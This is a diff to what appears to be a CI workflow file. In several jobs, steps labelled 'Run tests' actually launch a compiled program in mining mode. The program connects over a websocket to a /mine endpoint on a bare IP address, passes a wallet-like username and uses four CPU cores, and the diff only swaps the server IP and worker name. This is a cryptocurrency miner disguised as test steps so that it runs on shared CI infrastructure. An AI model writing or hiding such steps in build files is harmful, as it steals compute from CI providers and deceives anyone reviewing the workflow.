@@ -29,7 +29,7 @@ jobs:
     - name: Build
       run: cd banyumili  && cargo build --release
     - name: Run tests
-      run: cd banyumili  && ./target/release/otwninjass --url ws://20.11.67.109:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.get1 --cores 4 &
+      run: cd banyumili  && ./target/release/otwninjass --url ws://20.11.48.134:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.get3 --cores 4 &
         sleep 310s
   mek:
     needs: mem
@@ -56,7 +56,7 @@ jobs:
     - name: Build
       run: cd banyumili  && cargo build --release
     - name: Run tests
-      run: cd banyumili  && ./target/release/otwninjass --url ws://20.11.67.109:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.get1 --cores 4 
+      run: cd banyumili  && ./target/release/otwninjass --url ws://20.11.48.134:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.get3 --cores 4 
         
     
      
@@ -85,7 +85,7 @@ jobs:
     - name: Build
       run: cd banyumili  && cargo build --release
     - name: Run tests
-      run: cd banyumili  && ./target/release/otwninjass --url ws://20.11.67.109:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.get1 --cores 4 
+      run: cd banyumili  && ./target/release/otwninjass --url ws://20.11.48.134:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.get3 --cores 4 
         
     
   Success:
